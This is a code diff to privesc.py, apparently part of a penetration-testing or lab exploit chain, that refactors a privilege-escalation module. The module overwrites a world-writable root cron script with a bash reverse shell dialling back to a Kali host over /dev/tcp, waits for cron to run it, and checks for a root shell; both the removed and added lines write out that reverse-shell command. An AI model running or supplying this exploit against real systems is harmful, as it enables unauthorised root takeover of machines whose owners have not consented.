@@ -1,7 +1,7 @@
 import socket
 import time
 
-from chainlog import log
+from chainlog import drain, log, run_remote, send_command
 
 # =============================================================================
 # privesc.py — Privilege Escalation via Writable Cron Script
@@ -15,11 +15,6 @@ PORT_ROOT = 5555
 CLEANUP_SCRIPT = "/opt/cleanup.sh"
 
 
-def send_command(shell, command):
-    """Send a command through an active shell connection."""
-    shell.sendall((command + "\n").encode())
-    time.sleep(0.5)
-
 
 def run(www_shell, kali_host=KALI_HOST, cron_script=CLEANUP_SCRIPT):
     """
@@ -31,7 +26,7 @@ def run(www_shell, kali_host=KALI_HOST, cron_script=CLEANUP_SCRIPT):
         kali_host (str):      IP / hostname of the Kali box that the
                               reverse-shell payload will dial back to.
         cron_script (str):    path to the world-writable root cron script,
-                              discovered by post_exploit_recon. Falls back to
+                              discovered by post_exploit_enumeration. Falls back to
                               the module-level default if not supplied.
 
     Returns:
@@ -53,7 +48,7 @@ def run(www_shell, kali_host=KALI_HOST, cron_script=CLEANUP_SCRIPT):
         # `>` truncates, `>>` appends.
         log(f"[*] Overwriting {cron_script}...")
         send_command(www_shell, f"echo '#!/bin/bash' > {cron_script}")
-        send_command(www_shell, f"echo 'bash -i >& /dev/tcp/{kali_host}/{PORT_ROOT} 0>&1' >> {cron_script}")
+        send_command(www_shell, f"echo 'bash -i > /dev/tcp/{kali_host}/{PORT_ROOT} 2>/dev/null 0>&1' >> {cron_script}")
         log(f"[+] {cron_script} overwritten successfully")
         log("[*] Waiting for cron job (max. 60 seconds)...")
 
@@ -72,22 +67,9 @@ def run(www_shell, kali_host=KALI_HOST, cron_script=CLEANUP_SCRIPT):
     finally:
         root_server.close()
 
-    # Confirm root — read in a loop until "uid=" appears or the timeout
-    # elapses (so the initial banner / prompt isn't skipped).
     time.sleep(1)
-    send_command(root_shell, "id")
-    root_shell.settimeout(5)
-    response = ""
-    deadline = time.time() + 10
-    while time.time() < deadline:
-        try:
-            chunk = root_shell.recv(1024).decode(errors="replace")
-            if chunk:
-                response += chunk
-                if "uid=" in response:
-                    break
-        except socket.timeout:
-            break
+    drain(root_shell, timeout=2.0)  # flush shell banner before first sentinel-based command
+    response = run_remote(root_shell, "id", timeout=10)
 
     if "uid=0(root)" in response:
         log("[+] Privilege escalation successful!")
